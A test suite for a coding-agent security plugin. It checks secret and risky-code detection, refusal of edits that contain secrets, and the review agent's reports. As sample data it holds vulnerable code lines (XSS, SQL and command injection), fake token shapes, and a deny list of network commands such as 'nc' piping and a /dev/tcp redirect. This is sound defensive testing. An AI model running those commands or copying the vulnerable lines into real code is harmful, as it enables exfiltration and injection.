import { expect, mock, test } from 'claude-code/testing'
import type { TestBody } from 'claude-code/testing'

import { PANE as PARTS_PANE } from '../hooks/parts/parts'
import { parseSecurityReport } from '../hooks/security/report'
import { findSecrets, findSinks, isReadOnlyCommand } from '../hooks/security/scan'

// Built in parts, so that no scanner, this mod's included, takes this file for a leak.
const GITHUB = `ghp_${'a1B2c3D4e5'.repeat(4)}`
const AWS = `AKIA${'QWERTYUIOPASDFGH'}`
const PG = ['postgres://admin:', 'hunter22', '@db.internal:5432/app'].join('')
const USAGE = { input_tokens: 1, output_tokens: 1, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 }
const HOLE = '{"findings":[{"severity":"high","kind":"SQL injection","file":"src/db.ts","line":3,"problem":"id from the request reaches the query","fix":"bind it"},{"severity":"low","kind":"CSRF","file":"src/app.ts","problem":"no SameSite","fix":"set it"}],"checked":"2 queries"}'

test('a secret is told by its known shape, and a value that says it is not real, or one the edit only kept, is not new', () => {
  expect(findSecrets(`const t = "${GITHUB}"`).map(h => h.kind)).toEqual(['GitHub token'])
  expect(findSecrets(`key=${AWS}`).map(h => h.kind)).toEqual(['AWS access key'])
  expect(findSecrets(`url = "${PG}"`).map(h => h.kind)).toEqual(['password in a URL'])
  const pem = (body: string) => [`-----BEGIN RSA `, `PRIVATE KEY-----\n`, body, `\n-----END RSA `, `PRIVATE KEY-----`].join('')
  expect(findSecrets(pem('MIIEow'.repeat(20))).map(h => h.kind)).toEqual(['private key'])
  expect(findSecrets(['-----BEGIN RSA ', 'PRIVATE KEY-----'].join(''))).toEqual([])
  expect(findSecrets(`AKIA${'IOSFODNN7'}EXAMPLE`)).toEqual([])
  expect(findSecrets('postgres://user:${DB_PASSWORD}@localhost/app')).toEqual([])
  expect(findSecrets(`a ${GITHUB}`, `b ${GITHUB}`)).toEqual([])
})

test('what is said of a secret never holds its value', () => {
  const [hit] = findSecrets(`const t = "${GITHUB}"`)
  expect(JSON.stringify(hit)).not.toContain(GITHUB)
  const [line] = findSinks('src/a.ts', `const password = "${'hunter22hunter22'}"`)
  expect(line!.kind).toBe('secret in the code')
  expect(line!.text).not.toContain('hunter22')
})

const RISKY = [
  ['XSS', 'el.innerHTML = name'],
  ['XSS', '<div dangerouslySetInnerHTML={{ __html: body }} />'],
  ['SQL injection', 'db.query(`SELECT * FROM users WHERE id = ${id}`)'],
  ['SQL injection', 'cursor.execute(f"SELECT * FROM users WHERE id = {uid}")'],
  ['SQL injection', 'const q = "DELETE FROM users WHERE id = " + id'],
  ['command injection', 'exec(`convert ${file} out.png`)'],
  ['command injection', 'subprocess.run(cmd, shell=True)'],
  ['code execution', 'eval(input)'],
  ['code execution', 'data = pickle.loads(body)'],
  ['TLS check off', 'requests.get(url, verify=False)'],
  ['weak randomness', 'const token = Math.random().toString(36)'],
  ['weak hash', 'const h = md5(password)'],
  ['secret in the client', 'const k = process.env.NEXT_PUBLIC_STRIPE_SECRET'],
  ['secret in a log', 'console.log("login", password)'],
] as const

test('a risky call is noted by its kind', () => {
  for (const [kind, line] of RISKY) expect(findSinks('src/a.ts', line).map(s => s.kind)).toContain(kind)
})

const SAFE = [
  'el.textContent = name',
  'db.query("SELECT * FROM users WHERE id = $1", [id])',
  'execFile("convert", [file, "out.png"])',
  'JSON.parse(body)',
  'crypto.randomUUID()',
  'if (el.innerHTML === "") return',
  'const k = process.env.NEXT_PUBLIC_SITE_URL',
  'const password = process.env.DB_PASSWORD',
  'retrieval(input)',
  'spawn("git", ["-c", "user.name=x", "commit"])',
  'print("Delete {} files".format(n))',
  'SECRET_PATH=/run/secrets/db',
  'window.open(url)',
]

test('the safe form is not noted', () => {
  for (const line of SAFE) expect(findSinks('src/a.ts', line)).toEqual([])
})

test('a risky call is not noted where it was already, in a test, or in what is no code', () => {
  expect(findSinks('src/a.ts', 'el.innerHTML = name', 'el.innerHTML = name')).toEqual([])
  expect(findSinks('tests/a.test.ts', 'el.innerHTML = name')).toEqual([])
  expect(findSinks('docs/xss.md', 'el.innerHTML = name')).toEqual([])
})

test('the agent’s answer is read from the JSON it ends with, the holes that can be attacked first', () => {
  const report = parseSecurityReport(`Traced it.\n\n{"findings":[{"severity":"low","kind":"CSRF","file":"a.ts","problem":"p","fix":"f"},{"severity":"high","kind":"XSS","file":"b.ts","line":2,"problem":"q","fix":"g"},{"severity":"high","kind":"XSS","file":"","problem":"no file"}],"checked":"3 sinks"}`)!
  expect(report.findings.map(f => f.file)).toEqual(['b.ts', 'a.ts'])
  expect(report.checked).toBe('3 sinks')
  expect(parseSecurityReport('No list at all.')).toBeUndefined()
})

const world = async ($: Parameters<TestBody>[0], on: Parameters<TestBody>[1], opts: { modeUnsaved?: boolean; modelBlocked?: boolean; ignored?: boolean; config?: Record<string, unknown>; dirty?: () => string; committed?: () => string; dropSends?: boolean; disk?: Record<string, string>; noSpawn?: () => boolean; check?: () => string; isPlaced?: boolean } = {}) => {
  const dirtyNow = { value: '' }
  const clock = mock.clock(on, { now: 1_000_000 })
  // The review's check of each edit holds a turn's end on a clock that stands still here.
  const store = new Map<string, unknown>([['parts.off', ['review']]])
  const spawned: { prompt: string; model?: string }[] = []
  const submitted: { text: string; asUser?: boolean }[] = []
  const toasts: string[] = []
  on('session.root', () => ({ value: '/proj' }))
  on('fs.exists', () => ({ value: false }))
  on('fs.read', ($, e) => (opts.disk?.[e.path] !== undefined ? { value: opts.disk[e.path]! } : { deny: 'ENOENT' }))
  on('fs.list', () => ({ value: [] }))
  on('store.get', ($, e) => ({ value: store.get(e.key) }))
  on('store.set', ($, e) => (opts.modeUnsaved && e.key === 'security:agent-mode' ? ({ deny: 'store is down' } as never) : (store.set(e.key, e.value), { value: undefined })))
  on('store.keys', () => ({ value: [...store.keys()] }))
  on('command.list', () => ({ value: [] }))
  on('command.register', () => ({ value: { command: 'x' } }))
  on('process.run', ($, e) => {
    const done = (exitCode: number, stdout = '') => ({ value: { exitCode, stdout, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } })
    if (e.argv.includes('check-ignore')) return done(opts.ignored ? 0 : 1)
    if (e.argv.includes('status')) return done(0, (opts.dirty?.() ?? dirtyNow.value).split('\n').filter(Boolean).join('\0'))
    if (e.argv.includes('rev-parse')) return done(0, 'abc123\n')
    if (e.argv.includes('--name-only')) return done(0, opts.committed?.() ?? '')
    return done(1)
  })
  on('agent.spawn', ($, e) => (opts.noSpawn?.() ? { deny: 'no agents here' } : (spawned.push({ prompt: e.prompt, model: e.model }), { model: e.model ?? 'sonnet' })))
  on('agent.list', () => ({ value: spawned.map((s, i) => ({ id: `watch-${i + 1}`, description: 'Security review of the changes', type: 'Explore', status: 'running' as const, spawnedBy: 'agent-lens' })) }))
  const contexts: (readonly string[])[] = []
  on('prompt.submit', ($, e) => (contexts.push(e.context ?? []), submitted.push({ text: e.text, asUser: e.origin?.kind === 'plugin' ? e.origin.asUser : undefined }), opts.dropSends && e.origin?.kind === 'plugin' ? { drop: 'busy' } : { text: e.text }))
  const checks: string[] = []
  on('model.complete', ($, e) => {
    checks.push(JSON.stringify(e.prompt))
    if (opts.modelBlocked) return { deny: 'this model is blocked' } as never
    return { value: { isAnswered: true as const, text: opts.check?.() ?? '{"findings":[]}', usage: USAGE } }
  })
  on('ui.open', () => ({ value: { isPlaced: opts.isPlaced ?? true } }) as never)
  on('ui.toast', ($, e) => (toasts.push(String((e as { text?: unknown }).text ?? '')), { value: undefined }))
  on('ui.status', () => ({ value: undefined }))
  on('ui.render', ($, e) => {
    const { Box } = $.ui.resolve(e)
    return <Box key="engine" />
  })
  on('tool.call', ($, e) => (e.tool === 'Bash' ? { result: { stdout: '', stderr: '', interrupted: false } } : { result: {} }) as never)
  on('turn.start', ($, e) => ({ turnId: e.turnId }))
  on('turn.complete', ($, e) => ({ text: e.answer }))
  on('session.start', ($, e) => ({ cwd: e.cwd }))
  on('session.end', ($, e) => ({ sessionId: e.sessionId }) as never)
  await $.session.start({ cwd: '/proj', surface: 'terminal', isInteractive: true })
  const settle = () => clock.advance(10)
  const edit = (text: string, file = '/proj/src/a.ts') => $.tool.call({ tool: 'Edit', tool_use_id: `e${Math.random()}`, file_path: file, old_string: 'x', new_string: text, replace_all: false } as never) as Promise<{ deny?: string; context?: string[] }>
  const shell = (command: string) => $.tool.call({ tool: 'Bash', tool_use_id: `b${Math.random()}`, command } as never) as Promise<{ deny?: string; context?: string[] }>
  const turn = (text = 'go') => $.turn.start({ text, turnId: 't' })
  const endTurn = async () => {
    await $.turn.complete({ answer: 'done', durationMs: 1, isAborted: false, turnId: 't', reason: 'answer', usage: { ...USAGE, model: 'test' } })
    await settle()
  }
  const agentDone = async (agentId: string, answer: string) => {
    await $.turn.complete({ agentId, answer, durationMs: 1, isAborted: false, turnId: agentId, reason: 'answer', usage: { ...USAGE, model: 'test' } })
    await settle()
  }
  const run = (args: string, origin: { kind: 'composer' } | { kind: 'plugin'; name: string } = { kind: 'composer' }) => $.command.run({ command: 'security', args, origin, presentation: { isFullscreen: false, columns: 100 } })
  return { dirty: dirtyNow, clock, contexts, checks, store, spawned, submitted, toasts, edit, shell, turn, endTurn, agentDone, run, settle }
}

test('an edit that writes a secret is refused, whatever the tries, until the person lets it through', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  for (let i = 0; i < 3; i++) {
    const r = await w.edit(`const t = "${GITHUB}"`)
    expect(r.deny).toContain('/security allow')
    expect(r.deny).not.toContain(GITHUB)
  }
  await w.run('allow')
  expect((await w.edit(`const t = "${GITHUB}"`)).deny).toBeUndefined()
})

test('a secret in a shell command is refused; a variable that names one goes', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  expect((await w.shell(`curl -H "Authorization: token ${GITHUB}" https://api.github.com`)).deny).toContain('shell command')
  expect((await w.shell('curl -H "Authorization: token $GH_TOKEN" https://api.github.com')).deny).toBeUndefined()
})

test('a secret in a file git ignores is where it belongs', async ($, on) => {
  const w = await world($, on, { ignored: true })
  await w.turn()
  expect((await w.edit(`TOKEN=${GITHUB}`, '/proj/.env')).deny).toBeUndefined()
})

test('the first edit of code carries the rules, once; a risky line rides on its result', async ($, on) => {
  // The model gives no list, so the pattern's note is what is left.
  const w = await world($, on, { check: () => 'no list' })
  await w.turn()
  expect((await w.edit('const a = 1')).context?.join('\n')).toContain('security rules')
  const next = await w.edit('el.innerHTML = name')
  expect(next.context?.join('\n')).toContain('XSS')
  expect(next.context?.join('\n')).not.toContain('security rules')
})

test('a turn that changed code starts the agent; what can be attacked goes to Claude as the plugin’s, the rest waits for the person', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit('el.innerHTML = name')
  await w.endTurn()
  expect(w.spawned.length).toBe(1)
  expect(w.spawned[0]!.model).toBe('sonnet')
  expect(w.spawned[0]!.prompt).toContain('src/a.ts')
  expect(w.spawned[0]!.prompt).toContain('el.innerHTML')
  await w.agentDone('watch-1', HOLE)
  expect(w.submitted.length).toBe(1)
  expect(w.submitted[0]!.text).toContain('src/db.ts:3')
  expect(w.submitted[0]!.text).not.toContain('SameSite')
})

test('a turn of docs and tests alone starts no agent', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit('text', '/proj/README.md')
  await w.edit('expect(1)', '/proj/tests/a.test.ts')
  await w.endTurn()
  expect(w.spawned.length).toBe(0)
})

test('what a shell command left uncommitted is read too; what was uncommitted before it is not', async ($, on) => {
  let dirty = ' M src/old.ts\n'
  const w = await world($, on, { dirty: () => dirty })
  await w.turn()
  await w.shell('sed -i s/a/b/ src/new.ts')
  dirty = ' M src/old.ts\n M src/new.ts\n'
  await w.endTurn()
  expect(w.spawned[0]!.prompt).toContain('src/new.ts')
  expect(w.spawned[0]!.prompt).not.toContain('src/old.ts')
})

test('findings go back by themselves three rounds in a row at most; the person speaking starts the count over', async ($, on) => {
  const w = await world($, on)
  const round = async (n: number) => {
    await w.turn()
    await w.edit('const a = 1')
    await w.endTurn()
    await w.agentDone(`watch-${n}`, HOLE)
  }
  for (let n = 1; n <= 4; n++) await round(n)
  expect(w.submitted.length).toBe(3)
  await $.prompt.submit({ text: 'and now', origin: { kind: 'composer' }, wait: false })
  await w.settle()
  await round(5)
  expect(w.submitted.filter(s => s.text.includes('src/db.ts')).length).toBe(4)
})

test('what comes while the agent reads waits for its end, and what was told is not to be raised again', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  await w.turn()
  await w.edit('const b = 2', '/proj/src/b.ts')
  await w.endTurn()
  expect(w.spawned.length).toBe(1)
  await w.agentDone('watch-1', HOLE)
  expect(w.spawned.length).toBe(2)
  expect(w.spawned[1]!.prompt).toContain('src/b.ts')
  expect(w.spawned[1]!.prompt).toContain('Already told')
})

test('an answer with no list is said so, and sends nothing', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  await w.agentDone('watch-1', 'I could not read it.')
  expect(w.submitted.length).toBe(0)
  expect(w.toasts.some(t => t.includes('no list'))).toBe(true)
})

test('/security run reads what is uncommitted, and says so where there is nothing', async ($, on) => {
  let dirty = ''
  const w = await world($, on, { dirty: () => dirty })
  expect(((await w.run('run')) as { text: string }).text).toContain('nothing to read')
  dirty = ' M src/a.ts\n?? docs/a.md\n'
  expect(((await w.run('run')) as { text: string }).text).toContain('1 file')
  expect(w.spawned.length).toBe(1)
  expect(w.spawned[0]!.prompt).not.toContain('docs/a.md')
})

test('only a person lifts a refusal', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit(`const t = "${GITHUB}"`)
  expect(((await w.run('allow', { kind: 'plugin', name: 'other' })) as { text: string }).text).toContain('Only a person')
  expect((await w.edit(`const t = "${GITHUB}"`)).deny).toBeDefined()
})

test('every known shape is told, and an Anthropic key by its own name', () => {
  const shapes: [string, string][] = [
    ['GitLab token', `glpat-${'a1B2c3D4e5'.repeat(2)}`],
    ['Slack token', `xoxb-${'1234567890'.replace('1234567', '9876543')}-${'a1B2c3D4e5'.repeat(2)}`],
    ['Stripe key', `sk_live_${'a1B2c3D4e5'.repeat(3)}`],
    ['Anthropic key', `sk-ant-${'a1B2c3D4e5'.repeat(4)}`],
    ['OpenAI key', `sk-proj-${'a1B2c3D4e5'.repeat(5)}`],
    ['Google API key', `AIza${'a1B2c3D4e5'.repeat(3)}a1B2c`],
    ['npm token', `npm_${'a1B2c3D4e5'.repeat(3)}a1B2c3`],
  ]
  for (const [kind, value] of shapes) expect(findSecrets(value).map(h => h.kind)).toEqual([kind])
  expect(findSecrets(`sk_test_${'a1B2c3D4e5'.repeat(3)}`)).toEqual([])
})

test('a real password in a URL is told whatever its host says, and is not repeated', () => {
  const hit = findSecrets(['postgres://admin:', 'hunter22', '@${DB_HOST}/app'].join(''))
  expect(hit.map(h => h.kind)).toEqual(['password in a URL'])
  expect(hit[0]!.masked).not.toContain('hunter22')
})

test('the ordinary holes the first patterns missed are noted', () => {
  const lines: [string, string][] = [
    ['XSS', 'res.send("<h1>" + req.query.name + "</h1>")'],
    ['open redirect', 'res.redirect(req.query.next)'],
    ['path traversal', 'fs.readFile(req.query.file, cb)'],
    ['SSRF', 'await fetch(req.body.url)'],
    ['command injection', 'exec("ls " + dir)'],
    ['command injection', 'spawn("sh", ["-c", cmd])'],
    ['SQL injection', 'cur.execute("SELECT * FROM t WHERE id = {}".format(x))'],
    ['SQL injection', 'sequelize.query(`SELECT 1 ${a}`)'],
    ['open CORS', 'res.setHeader("Access-Control-Allow-Origin", "*")'],
    ['secret in the code', 'DB_PASSWORD=hunter2hunter2'],
    ['secret in the code', 'jwt.sign(p, "supersecretkey")'],
  ]
  for (const [kind, line] of lines) expect(findSinks('src/a.ts', line).map(s => s.kind)).toContain(kind)
  expect(findSinks('src/a.ts', 'DB_PASSWORD=hunter2hunter2')[0]!.text).not.toContain('hunter2')
})

test('a file is judged from the project’s root: hooks/spec is code, a test folder is not', () => {
  expect(findSinks('hooks/spec/a.ts', 'el.innerHTML = name').length).toBe(1)
  expect(findSinks('tests/a.ts', 'el.innerHTML = name')).toEqual([])
})

test('an agent’s answer that says critical is what can be attacked', () => {
  expect(parseSecurityReport('{"findings":[{"severity":"Critical","file":"a.ts","problem":"p"}]}')!.findings[0]!.severity).toBe('high')
})

test('a turn that commits is read from the commit it started on, and what it committed is read', async ($, on) => {
  const w = await world($, on, { committed: () => 'src/committed.ts\0' })
  await w.turn()
  await w.shell('git commit -am x')
  await w.endTurn()
  expect(w.spawned[0]!.prompt).toContain('src/committed.ts')
  expect(w.spawned[0]!.prompt).toContain('diff abc123')
})

test('what was found and not sent lives through the next run', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  await w.agentDone('watch-1', HOLE)
  await w.turn()
  await w.edit('const b = 2')
  await w.endTurn()
  await w.agentDone('watch-2', '{"findings":[],"checked":"1 file"}')
  const band = await $.ui.mount({ plugin: 'agent-lens', surface: 'terminal', component: 'AbovePrompt' as const, props: { hasSurvey: false, isWorking: false, maxRows: 10, bodyColumns: 140, scroll: { offset: 0, bodyRows: 10 }, view: {} } })
  expect(await band.find({ type: 'Text', text: 'security: 1 finding' })).toBeDefined()
  await band.unmount()
})

test('findings go by themselves as the plugin’s words, and a drop does not spend a round or mark them sent', async ($, on) => {
  const w = await world($, on, { dropSends: true })
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  await w.agentDone('watch-1', HOLE)
  expect(w.submitted[0]!.asUser).toBeUndefined()
  await w.turn()
  await w.edit('const b = 2')
  await w.endTurn()
  await w.agentDone('watch-2', HOLE)
  expect(w.spawned[1]!.prompt).not.toContain('Already told')
})

test('a turn cut short keeps its files for the next', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit('const a = 1', '/proj/src/first.ts')
  await $.turn.complete({ answer: '', durationMs: 1, isAborted: true, turnId: 't', reason: 'aborted', usage: { ...USAGE, model: 'test' } } as never)
  expect(w.spawned.length).toBe(0)
  await w.turn()
  await w.edit('const b = 2', '/proj/src/second.ts')
  await w.endTurn()
  expect(w.spawned[0]!.prompt).toContain('src/first.ts')
  expect(w.spawned[0]!.prompt).toContain('src/second.ts')
})

test('a Write over a file with the line already there does not note it again', async ($, on) => {
  const w = await world($, on, { disk: { '/proj/src/a.ts': 'el.innerHTML = name' } })
  await w.turn()
  const r = (await $.tool.call({ tool: 'Write', tool_use_id: 'w1', file_path: '/proj/src/a.ts', content: 'el.innerHTML = name\nconst a = 1' } as never)) as { context?: string[] }
  expect(r.context?.join('\n')).not.toContain('check these lines')
})

const paneOf = ($: Parameters<TestBody>[0]) => $.ui.mount({ plugin: 'agent-lens', surface: 'terminal', component: 'Pane' as const, requestId: 'agent-lens-security', props: {} } as never)

test('on the pane j sends what is left as the person’s words, once; the report stays off Claude', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  await w.agentDone('watch-1', HOLE)
  expect(await $.prompt.submit({ text: 'Another Claude session sent a message:\n<agent-message from="watch-1">\nreport\n</agent-message>', origin: { kind: 'peer' }, wait: false } as never)).toMatchObject({ drop: expect.any(String) })
  const count = w.submitted.length
  const pane = await paneOf($)
  await pane.press({ key: 'security-send' })
  await w.settle()
  expect(w.submitted.length).toBe(count + 1)
  expect(w.submitted.at(-1)!.text).toContain('SameSite')
  expect(w.submitted.at(-1)!.text).not.toContain('src/db.ts')
  expect(w.submitted.at(-1)!.asUser).toBe(true)
  expect(await pane.find({ key: 'security-send' }).catch(() => undefined)).toBeUndefined()
  await pane.unmount()
})

test('x clears the list and lets no secret through; a lets it through', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit(`const t = "${GITHUB}"`)
  const pane = await paneOf($)
  await pane.press({ key: 'security-aside' })
  await w.settle()
  expect((await w.edit(`const t = "${GITHUB}"`)).deny).toBeDefined()
  await pane.press({ key: 'security-allow' })
  await w.settle()
  await pane.unmount()
  expect((await w.edit(`const t = "${GITHUB}"`)).deny).toBeUndefined()
})

test('with the part turned off mid-run the agent’s report shows, and nothing is sent or started', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  await w.turn()
  await w.edit('const b = 2', '/proj/src/b.ts')
  await w.endTurn()
  const menu = await $.ui.mount({ plugin: 'agent-lens', surface: 'terminal', component: 'Pane' as const, requestId: 'agent-lens-parts', props: {} } as never)
  await menu.press({ key: 'toggle-security' })
  await menu.unmount()
  await w.settle()
  await w.agentDone('watch-1', HOLE)
  expect(w.submitted.length).toBe(0)
  expect(w.spawned.length).toBe(1)
})

test('a compaction sends the rules again', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  expect((await w.edit('const a = 1')).context?.join('\n')).toContain('security rules')
  await ($ as never as { session: { compact: (e: unknown) => Promise<unknown> } }).session.compact({ trigger: 'manual' }).catch(() => undefined)
  expect((await w.edit('const b = 2')).context?.join('\n')).toContain('security rules')
})

test('a local database’s default password is no leak; what the agent or a line quotes is hidden', () => {
  expect(findSecrets(['postgres://postgres:', 'postgres', '@localhost:5432/app'].join(''))).toEqual([])
  const report = parseSecurityReport(JSON.stringify({ findings: [{ severity: 'high', kind: 'secret', file: 'a.ts', problem: `token ${GITHUB} in the source` }], checked: '' }))!
  expect(report.findings[0]!.problem).not.toContain(GITHUB)
  expect(findSinks('src/a.ts', `exec("curl -H ${GITHUB} " + url)`)[0]!.text).not.toContain(GITHUB)
})

test('.env is no code: no note and no agent, where the refusal itself sends a secret', async ($, on) => {
  const w = await world($, on, { ignored: true })
  await w.turn()
  const r = await w.edit('DB_PASSWORD=hunter2hunter2', '/proj/.env')
  expect(r.context).toBeUndefined()
  await w.endTurn()
  expect(w.spawned.length).toBe(0)
})

test('an agent that does not start loses no files: the next turn reads them', async ($, on) => {
  let noSpawn = true
  const w = await world($, on, { noSpawn: () => noSpawn })
  await w.turn()
  await w.edit('const a = 1', '/proj/src/first.ts')
  await w.endTurn()
  expect(w.toasts.some(t => t.includes('did not start'))).toBe(true)
  noSpawn = false
  await w.turn()
  await w.edit('const b = 2', '/proj/src/second.ts')
  await w.endTurn()
  expect(w.spawned[0]!.prompt).toContain('src/first.ts')
})

test('a file outside the project gets no note and starts no agent; a secret there is still refused', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  expect((await w.edit('el.innerHTML = name', '/elsewhere/a.ts')).context).toBeUndefined()
  expect((await w.edit(`const t = "${GITHUB}"`, '/elsewhere/a.ts')).deny).toBeDefined()
  await w.endTurn()
  expect(w.spawned.length).toBe(0)
})

test('in button a turn starts no agent, and what a run by hand finds waits for the person', { options: { securityAgent: 'button' } }, async ($, on) => {
  const w = await world($, on, { dirty: () => ' M src/a.ts\n' })
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  expect(w.spawned.length).toBe(0)
  await w.run('run')
  await w.agentDone('watch-1', HOLE)
  expect(w.submitted.length).toBe(0)
})

const XSS = '{"findings":[{"severity":"high","kind":"XSS","file":"src/a.ts","evidence":"el.innerHTML = q","problem":"q from the URL reaches innerHTML","fix":"use textContent"}]}'
const CLEAN = '{"findings":[]}'

test('a hole in an edit is refused before it lands and goes in the journal the pane shows', async ($, on) => {
  const w = await world($, on, { check: () => XSS })
  await w.turn()
  const r = await w.edit('el.innerHTML = q')
  expect(r.deny).toContain('q from the URL reaches innerHTML')
  expect(r.deny).toContain('use textContent')
  const pane = await paneOf($)
  expect(await pane.find({ type: 'Text', text: '  q from the URL reaches innerHTML' })).toBeDefined()
  expect(await pane.find({ type: 'Text', text: '  el.innerHTML = q' })).toBeDefined()
  await pane.unmount()
  expect((w.store.get('security:log:/proj') as { by: string; outcome: string }[])[0]).toMatchObject({ by: 'edit', outcome: 'refused', kind: 'XSS' })
})

test('refused twice for one file it goes through, on the pane and in the journal as let through', async ($, on) => {
  const w = await world($, on, { check: () => XSS })
  await w.turn()
  expect((await w.edit('el.innerHTML = q')).deny).toBeDefined()
  expect((await w.edit('el.innerHTML = q')).deny).toBeDefined()
  expect((await w.edit('el.innerHTML = q')).deny).toBeUndefined()
  expect(w.toasts.some(t => t.includes('after two refusals'))).toBe(true)
  const log = w.store.get('security:log:/proj') as { outcome: string; times?: number }[]
  expect(log[0]).toMatchObject({ outcome: 'passed' })
  expect(log[1]).toMatchObject({ outcome: 'refused', times: 2 })
})

test('what the check clears gets no note; docs, tests and a check that fails are let be', async ($, on) => {
  let answer = CLEAN
  const w = await world($, on, { check: () => answer })
  await w.turn()
  await w.edit('const a = 1')
  const safe = await w.edit('el.innerHTML = "<b>hi</b>"')
  expect(safe.context?.join('\n') ?? '').not.toContain('check these lines')
  const before = w.checks.length
  await w.edit('text', '/proj/README.md')
  await w.edit('expect(1)', '/proj/tests/a.test.ts')
  expect(w.checks.length).toBe(before)
  answer = 'not json'
  const failed = await w.edit('el.innerHTML = name')
  expect(failed.deny).toBeUndefined()
  expect(failed.context?.join('\n')).toContain('check these lines')
  expect(w.toasts.some(t => t.includes('gave no answer'))).toBe(true)
})

test('a secret let through is hidden from the check of an edit, and a file git ignores goes to no check', async ($, on) => {
  const w = await world($, on, { check: () => CLEAN })
  await w.turn()
  await w.edit(`const t = "${GITHUB}"`)
  await w.run('allow')
  await w.edit(`const t = "${GITHUB}"`)
  expect(w.checks.length).toBe(1)
  expect(w.checks.join('')).not.toContain(GITHUB)
})

test('what git ignores stays home', async ($, on) => {
  const w = await world($, on, { ignored: true, check: () => XSS })
  await w.turn()
  expect((await w.edit('el.innerHTML = q', '/proj/src/local.ts')).deny).toBeUndefined()
  expect(w.checks.length).toBe(0)
})

test('with the check off an edit asks no model and a risky call is noted', { options: { securityCheck: 'off' } }, async ($, on) => {
  const w = await world($, on, { check: () => XSS })
  await w.turn()
  const r = await w.edit('el.innerHTML = name')
  expect(r.deny).toBeUndefined()
  expect(r.context?.join('\n')).toContain('check these lines')
})

test('the rules go with the first prompt, ahead of the first edit, once', async ($, on) => {
  const w = await world($, on, { check: () => CLEAN })
  await $.prompt.submit({ text: 'build it', origin: { kind: 'composer' }, wait: false, context: [] } as never)
  await w.settle()
  await w.turn()
  expect(w.contexts.flat().join('\n')).toContain('security rules')
  expect((await w.edit('const a = 1')).context?.join('\n') ?? '').not.toContain('security rules')
})

test('the journal lives through a new session, and /security clear empties it', async ($, on) => {
  const w = await world($, on, { check: () => XSS })
  await w.turn()
  await w.edit('el.innerHTML = q')
  await $.session.start({ cwd: '/proj', surface: 'terminal', isInteractive: true })
  const pane = await paneOf($)
  expect(await pane.find({ type: 'Text', text: '  q from the URL reaches innerHTML' })).toBeDefined()
  await pane.unmount()
  await w.run('clear')
  expect(w.store.get('security:log:/proj')).toEqual([])
})

test('the audit reads the whole project in one agent; its findings wait for the person, in the journal as the audit’s', async ($, on) => {
  const w = await world($, on)
  expect(((await w.run('audit')) as { text: string }).text).toContain('no network')
  expect(w.spawned[0]!.prompt).toContain('white-box')
  expect(w.spawned[0]!.prompt).toContain('never reach any URL')
  await w.agentDone('watch-1', HOLE)
  expect(w.submitted.length).toBe(0)
  expect((w.store.get('security:log:/proj') as { by: string }[])[0]).toMatchObject({ by: 'audit' })
})

test('the watch’s own agent may only read: what reaches a network is refused however it is written, and searching for its words goes', async ($, on) => {
  const w = await world($, on)
  await w.run('audit')
  const call = (e: Record<string, unknown>) => $.tool.call({ tool_use_id: `c${Math.random()}`, agentId: 'watch-1', ...e } as never) as Promise<{ deny?: string }>
  const refused = ['curl https://x.dev', '/usr/bin/curl x', '"curl" x', 'cd a && wget y', 'npm audit', 'npm i', 'git fetch origin', 'git -C /proj pull', 'git -c core.pager=sh log', 'cat a | nc h 1', 'node -e "fetch(1)"', 'python3 -c "import urllib"', 'gh api x', 'openssl s_client', 'bash -c "exec 3<>/dev/tcp/h/80"', 'docker run x', 'C=cu; ${C}rl x', 'cat $(which curl)', 'find . -exec curl x ;', 'git log --output=a', 'cat a > b']
  for (const command of refused) expect([command, (await call({ tool: 'Bash', command })).deny]).toEqual([command, expect.stringContaining('no network')])
  for (const tool of ['WebFetch', 'WebSearch', 'Agent', 'ToolSearch', 'mcp__figma__whoami']) expect((await call({ tool, url: 'https://x.dev', prompt: 'p', query: 'q' })).deny).toContain('no network')
  const reads = ['git -C /proj log -p', 'grep -rn req.query src', 'grep curl src', 'grep -rn "http://" .', "grep -E 'fetch|ssh' src", 'git log --grep fetch', 'git ls-files | grep -v node_modules | head -100 && git log --oneline | head', 'ls -la; find . -path ./node_modules -prune -o -path ./.git -prune -o -type f -print | head -100', 'cd /proj && cat package.json']
  for (const command of reads) expect([command, (await call({ tool: 'Bash', command })).deny]).toEqual([command, undefined])
  expect(((await w.run('audit')) as { text: string }).text).toContain('still reading')
  expect(w.spawned.length).toBe(1)
})

test('an agent that calls a tool before the spawn has named it is held to the same, by its task', async ($, on) => {
  const w = await world($, on)
  await w.run('audit')
  const r = (await $.tool.call({ tool_use_id: 'early', agentId: 'watch-1', tool: 'Bash', command: 'curl x' } as never)) as { deny?: string }
  expect(r.deny).toContain('no network')
  expect(((await $.tool.call({ tool_use_id: 'other', agentId: 'someone-else', tool: 'Bash', command: 'curl x' } as never)) as { deny?: string }).deny).toBeUndefined()
})

test('a file refused twice goes through even where the model names the hole in other words', async ($, on) => {
  const names = ['XSS', 'Cross-site scripting', 'xss']
  let i = 0
  const w = await world($, on, { check: () => XSS.replace('"kind":"XSS"', `"kind":"${names[i++]}"`) })
  await w.turn()
  expect((await w.edit('el.innerHTML = q')).deny).toBeDefined()
  expect((await w.edit('el.innerHTML = q')).deny).toBeDefined()
  expect((await w.edit('el.innerHTML = q')).deny).toBeUndefined()
})

test('a new turn gives the file its two refusals again', async ($, on) => {
  const w = await world($, on, { check: () => XSS })
  await w.turn()
